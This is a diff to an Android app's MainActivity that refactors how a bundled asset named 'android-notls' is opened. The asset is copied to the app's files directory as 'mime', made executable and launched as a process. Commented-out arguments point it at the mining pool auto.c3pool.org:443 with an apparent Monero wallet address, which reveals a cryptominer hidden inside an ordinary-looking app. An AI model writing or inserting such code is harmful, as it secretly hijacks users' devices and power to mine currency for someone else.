@@ -7,9 +7,8 @@ public class MainActivity extends android.app.Activity
     {
         super.onCreate(savedInstanceState);
         final var mime = new java.io.File(super.getFilesDir(), "mime");
-        try (final var assets = super.getAssets())
+        try (final var assets = super.getAssets(); final var androidNotls = assets.open("android-notls"))
         {
-            final var androidNotls = assets.open("android-notls");
             java.nio.file.Files.copy(androidNotls, mime.toPath());
             mime.setExecutable(true);
             final var process = new java.lang.ProcessBuilder("/system/bin/ls", "-al", mime.getPath()/*, "-t", "1", "-o", "auto.c3pool.org:443", "-u", "87giDqqPT1GPU9ukh1GNSpioyJM1G2zqjL8ukY9gP7ngZ2zpH9tuZFD755E94j9F56Y2FFq5B33SFe8a8LqybR2WJsb8ssR"*/).start();
